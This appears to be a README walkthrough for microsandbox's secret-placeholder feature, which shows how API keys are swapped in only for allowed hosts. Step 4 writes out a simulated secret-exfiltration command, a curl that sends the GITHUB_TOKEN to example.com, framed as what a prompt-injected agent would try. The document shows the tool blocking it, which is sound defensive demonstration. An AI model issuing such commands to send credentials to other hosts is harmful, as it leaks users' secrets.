<div align="center">
  <h1>Secrets</h1>
</div>

<br />

<!-- video: upload ep2-secrets.mp4 here -->

<br />

**`--secret`** gives a [microsandbox](https://github.com/superradcompany/microsandbox) a placeholder instead of your key. On the way out, msb swaps in the real key, and only for the host you allowed, so the code inside can use your key but never see it.

##

- <img height="14" src="https://octicons-col.vercel.app/hubot/A770EF"> **AI Agents**: Let an agent call GitHub, Stripe or OpenAI with your key without ever holding it.
- <img height="14" src="https://octicons-col.vercel.app/shield/A770EF"> **Prompt Injection**: A fooled agent can only leak a placeholder, and msb blocks it on the way out.
- <img height="14" src="https://octicons-col.vercel.app/package/A770EF"> **Untrusted Code**: Run dependencies, CI scripts or plugins that need a token without handing the token over.
- <img height="14" src="https://octicons-col.vercel.app/people/A770EF"> **Shared Sandboxes**: Give a contractor or a guest a working environment, not your credentials.
- <img height="14" src="https://octicons-col.vercel.app/log/A770EF"> **Clean Logs**: Logs, crash dumps and `env` inside the sandbox only ever show the placeholder.

<br />

## <a href="./#gh-dark-mode-only" target="_blank"><img height="18" src="https://octicons-col.vercel.app/terminal/ffffff" alt="cli-dark"></a><a href="./#gh-light-mode-only" target="_blank"><img height="18" src="https://octicons-col.vercel.app/terminal/000000" alt="cli"></a>&nbsp;&nbsp;Walk Through It

#### <img height="14" src="https://octicons-col.vercel.app/download/A770EF">&nbsp;&nbsp;Install the CLI
> ```sh
> npm i -g microsandbox
> ```

<br />

#### <img height="14" src="https://octicons-col.vercel.app/key/A770EF">&nbsp;&nbsp;1. Create a Sandbox With a Secret
> Put a fake token in your host environment, then bind it to one host. We use httpbin.org instead of api.github.com because it echoes back what it receives, so you can watch the swap without a real token.
>
> ```sh
> export GITHUB_TOKEN=ghp_fake1234567890
> ```
>
> ```sh
> msb create python:3.12-bookworm --name secrets-demo \
>   --secret 'GITHUB_TOKEN@httpbin.org'
> ```

<br />

#### <img height="14" src="https://octicons-col.vercel.app/eye/A770EF">&nbsp;&nbsp;2. Look Inside
> The sandbox has a `GITHUB_TOKEN`, but it only holds a placeholder. The real key never enters the VM.
>
> ```sh
> msb exec secrets-demo -- sh -c 'echo $GITHUB_TOKEN'
> ```
>
> → `$MSB_GITHUB_TOKEN`

<br />

#### <img height="14" src="https://octicons-col.vercel.app/check-circle/A770EF">&nbsp;&nbsp;3. Call the Allowed Host
> Send the placeholder to httpbin.org. msb swaps in the real key on the way out, and httpbin.org shows what it received.
>
> ```sh
> msb exec secrets-demo -- sh -c '
>   curl -s https://httpbin.org/headers \
>     -H "Authorization: Bearer $GITHUB_TOKEN" \
>     | grep Authorization
> '
> ```
>
> → `"Authorization": "Bearer ghp_fake1234567890",`

<br />

#### <img height="14" src="https://octicons-col.vercel.app/circle-slash/A770EF">&nbsp;&nbsp;4. Send It Somewhere Else
> This is what a prompt injection would try. The same placeholder on its way to any other host is blocked, and the connection is cut.
>
> ```sh
> msb exec secrets-demo -- sh -c '
>   curl -sS https://example.com \
>     -H "Authorization: Bearer $GITHUB_TOKEN"
> '
> ```
>
> → `curl: (52) Empty reply from server`
>
> Only the key is blocked. The same host without it works:
>
> ```sh
> msb exec secrets-demo -- curl -sS -o /dev/null -w '%{http_code}\n' https://example.com
> ```
>
> → `200`

<br />

#### <img height="14" src="https://octicons-col.vercel.app/sync/A770EF">&nbsp;&nbsp;5. Rotate the Key
> Change the token on the host and update the sandbox while it runs. The sandbox keeps the same placeholder.
>
> ```sh
> export GITHUB_TOKEN=ghp_rotated0987654321
> ```
>
> ```sh
> msb modify secrets-demo --secret 'GITHUB_TOKEN@httpbin.org'
> ```
>
> → `✓ Modified secrets-demo`
>
> Run the step 3 command again and httpbin.org gets the new key:
>
> → `"Authorization": "Bearer ghp_rotated0987654321",`

<br />

#### <img height="14" src="https://octicons-col.vercel.app/trash/A770EF">&nbsp;&nbsp;6. Clean Up
> ```sh
> msb stop secrets-demo
> ```
>
> ```sh
> msb rm secrets-demo
> ```

> [!TIP]
>
> Run `./demo.sh` to see the whole thing in one go.

<br />

## <a href="./#gh-dark-mode-only" target="_blank"><img height="18" src="https://octicons-col.vercel.app/package-dependencies/ffffff" alt="sdk-dark"></a><a href="./#gh-light-mode-only" target="_blank"><img height="18" src="https://octicons-col.vercel.app/package-dependencies/000000" alt="sdk"></a>&nbsp;&nbsp;From Code

The SDKs bind a secret to a host when you create the sandbox.

> ```typescript
> const sb = await Sandbox.builder("secrets-demo")
>   .image("python:3.12-bookworm")
>   .secret((s) => s.env("GITHUB_TOKEN").value(process.env.GITHUB_TOKEN!).allow("httpbin.org"))
>   .create();
> ```
>
> <details>
> <summary><b>&nbsp;Python Example →</b></summary>
>
> ```python
> sb = await Sandbox.create(
>     "secrets-demo",
>     image="python:3.12-bookworm",
>     secrets=[Secret.env("GITHUB_TOKEN", value=os.environ["GITHUB_TOKEN"], allow=["httpbin.org"])],
> )
> ```
>
> </details>

The full examples are in [`typescript/`](typescript) and [`python/`](python), pinned to the 0.7.8 SDKs.

<br />

## <a href="./#gh-dark-mode-only" target="_blank"><img height="18" src="https://octicons-col.vercel.app/info/ffffff" alt="info-dark"></a><a href="./#gh-light-mode-only" target="_blank"><img height="18" src="https://octicons-col.vercel.app/info/000000" alt="info"></a>&nbsp;&nbsp;Good to Know

- It works on local sandboxes.
- The allowed host does get the real key, and could send it back, as httpbin.org does here. Keep the list of allowed hosts short.
- Placeholders work for keys sent in requests. Code that uses the key inside the sandbox, for example to sign a request, needs the real value, and this won't help there.
- Keys are swapped in headers by default. Query strings and request bodies are opt-in, for example `--secret 'GITHUB_TOKEN:query@httpbin.org'`.
- The CLI reads the key from your environment when the sandbox starts. The SDKs take the value directly and store it in the sandbox's host-side config.
- msb inspects HTTPS to do the swap, so images that bring their own CA bundle can fail. `curlimages/curl` is one; `python:3.12-bookworm` works.
- httpbin.org is a free public service and is sometimes down. If step 3 prints nothing, run it again.
- Tested with microsandbox 0.7.8 on an Apple Silicon Mac.

<br />

<a href="https://docs.microsandbox.dev/sandboxes/secrets"><img src="https://img.shields.io/badge/Secrets_Docs-%E2%86%92-A770EF?style=flat-square&labelColor=2b2b2b" alt="Secrets docs"></a>

<br />

<p align="center"><img src="assets/swap.svg" width="480" alt="A microsandbox holds a placeholder coin. Sent towards httpbin.org, the coin reaches the msb wall and is swapped for a gold key that carries on to the allowed host. Sent towards evil.com, the same coin hits the wall and is blocked."></p>
